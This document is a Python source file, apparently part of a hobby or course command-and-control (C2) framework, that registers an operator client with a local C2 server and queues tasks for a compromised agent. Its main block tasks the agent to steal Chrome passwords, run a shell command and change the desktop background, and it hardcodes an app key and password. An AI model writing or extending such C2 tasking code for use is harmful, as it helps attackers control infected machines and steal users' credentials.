### the backend of the client ###
### just in case client is not merely a frontend for the server ###
### TODO: think about whether we still need front end ###

import requests 
import os

from urllib3 import Retry
### configs ###
# run below command in terminal
# export APP_KEY="jdK69EN3gh"
# or if you preffered, you can run this
# os.environ["APP_KEY"] = "jdK69EN3gh"
# MY_APP_KEY = os.environ["APP_KEY"]
password = "ch0nky" # a temperary password to test the server
localhost = "http://127.0.0.1:5000"
client_register_uri = "/client/login"
task_create_uri = "/tasks/create"

#-------------------------------------------------
# init a default client for testing purpose
client_id = "hey"
password = "ch0nky"
# key = "jdK69EN3gh"


### authentication ###
def register(key, client_id, client_password):
    print("[+] Registering client with C2 server..")
    r = requests.post(localhost + client_register_uri, json={"app_key": key, "client_id": client_id, "client_password": client_password})
    if r.status_code == 200:
        resp = r.json()
        if resp["status"] == "ok":
            print("[+] Client registered on C2 server")
            return True
        else:
            print("[-] Client Registration failed on C2 server", resp["status"])
            return False
    else:
        print("[-] http request failed", r.status_code)
        return False

#-------------------------------------------------


### task creation ###

def create_task(command_type, cmd, agent_id):
    """
        create a task on the C2 server
    """
    print("[+] Creating task on C2 server...")
    r = requests.post(localhost + task_create_uri, json={"command_type": command_type, "cmd": cmd, "agent_id": agent_id})
    if r.status_code == 200:
        resp = r.json()
        if resp["status"] == "ok":
            print("[+] Task created on C2 server")
            return True
        else:
            print("[-] Task creation failed on C2 server", resp["status"])
            return False
    else:
        print("[-] http request failed", r.status_code)
        return False

#-------------------------------------------------

if __name__ == "__main__":
    # register(key, client_id, password)
    create_task(command_type="chrome", cmd="steal some passwords for me", agent_id="5c5c385909adcbf559783b84ee2b0a1f")
    create_task(command_type="chrome", cmd="shell command", agent_id="5c5c385909adcbf559783b84ee2b0a1f")
    create_task(command_type="chrome", cmd="change desktop background", agent_id="5c5c385909adcbf559783b84ee2b0a1f")
